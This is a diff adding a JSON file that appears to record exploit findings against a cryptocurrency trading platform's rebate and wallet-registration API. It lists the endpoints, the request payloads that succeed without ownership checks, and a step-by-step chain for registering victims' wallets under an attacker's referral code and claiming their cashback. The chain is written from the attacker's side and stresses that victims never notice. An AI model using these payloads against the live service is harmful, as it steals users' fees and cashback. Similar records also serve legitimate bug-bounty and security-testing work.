@@ -1,0 +1,58 @@
+{
+  "vulnerability": "CRITICAL - Cashback Claim IDOR + Register Wallet Referral Hijack",
+  "severity": "CRITICAL",
+  "findings": [
+    {
+      "endpoint": "POST /rebate/api/v1/cashback/claim/apply",
+      "payload": {
+        "chain": "sol",
+        "address": "VICTIM_WALLET_ADDRESS"
+      },
+      "response": {
+        "code": 0,
+        "message": "success",
+        "data": {
+          "status_code": "CB5003",
+          "message": "User Cashback Founds Insufficient"
+        }
+      },
+      "impact": "Claim any wallet cashback without ownership check. Only fails if no pending balance.",
+      "note": "code:0 = processed. NOT \"wallet not owned\". Reaches business logic."
+    },
+    {
+      "endpoint": "POST /defi/quotation/v1/register_wallet",
+      "payloads_all_succeed": [
+        {
+          "chain": "sol",
+          "address": "VICTIM",
+          "user_id": "OUR_ID"
+        },
+        {
+          "chain": "sol",
+          "address": "VICTIM",
+          "invite_code": "OUR_CODE"
+        },
+        {
+          "chain": "sol",
+          "address": "VICTIM",
+          "referrer": "OUR_USER_ID"
+        }
+      ],
+      "impact": "Register ANY wallet under attacker referral tree. Victim fees/cashback route to attacker.",
+      "note": "All return code:0 success. Zero ownership validation."
+    },
+    {
+      "endpoint": "GET /rebate/api/v1/cashback/pending",
+      "response": {
+        "user_id": "00dae870-8490-4d19-bfc0-39ce49e906b5"
+      },
+      "impact": "Cashback system returns OUR user_id for victim address - wallet is linked to us"
+    }
+  ],
+  "exploit_chain": [
+    "1. register_wallet(victim_address, invite_code=ours, referrer=our_id) \u2192 code:0",
+    "2. Victim trades normally \u2192 referral fees silently flow to attacker",
+    "3. Victim earns cashback \u2192 attacker claims via cashback/claim/apply",
+    "4. Completely silent - victim never knows commissions are stolen"
+  ]
+}
